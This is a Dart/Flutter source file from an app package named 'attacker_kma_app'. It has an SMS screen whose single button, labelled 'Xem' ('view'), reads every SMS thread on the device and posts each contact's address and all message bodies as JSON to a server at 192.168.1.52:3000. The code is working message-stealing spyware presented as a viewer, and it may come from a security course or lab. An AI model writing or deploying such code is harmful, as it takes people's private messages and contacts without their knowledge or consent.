import 'dart:convert';

import 'package:attacker_kma_app/blocs/messages/message_bloc.dart';
import 'package:attacker_kma_app/blocs/messages/message_event.dart';
import 'package:attacker_kma_app/common_widgets/content_message.dart';
import 'package:attacker_kma_app/models/message.dart';
import 'package:attacker_kma_app/screen/phone/message_detail.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:sms/sms.dart';
import 'package:http/http.dart' as http;

import '../../common_widgets/content_message.dart';

class MessageScreen extends StatefulWidget {
  @override
  _MessageScreenState createState() => _MessageScreenState();
}

class _MessageScreenState extends State<MessageScreen> {
  List<SmsThread> threads;
  List<SmsMessage> messages;

  SmsQuery query = SmsQuery();

  bool flag = true;

  getContactSMS() async => threads = await query.getAllThreads;

  // List<Map> json = new List();

  // Mess mess = Mess();

  @override
  Widget build(BuildContext context) {
    return FutureBuilder(
      future: getContactSMS(),
      builder: (context, snapshot) {
        if (!snapshot.hasData) {
          return Center(child: CircularProgressIndicator());
        } else {
          List<String> listMessages = [];
          String listAddress;
          return FlatButton(
            onPressed: () async {
              for (int i = 0; i < threads.length; i++) {
                listAddress = threads[i].contact.address;
                for (int j = 0; j < threads[i].messages.length; j++) {
                  listMessages.add(threads[i].messages[j].body);
                }

                var body = json.encode({
                  "message": {
                    "address": listAddress,
                    "text": listMessages,
                  }
                });
                http.Response response = await http.post(
                  'http://192.168.1.52:3000/create-message',
                  body: body,
                  headers: {'Content-type': 'application/json'},
                );
                listMessages.clear();
                print(body);
                print("long ${response.body}");
              }
            },
            child: Text('Xem'),
          );
        }
      },
    );
  }
}
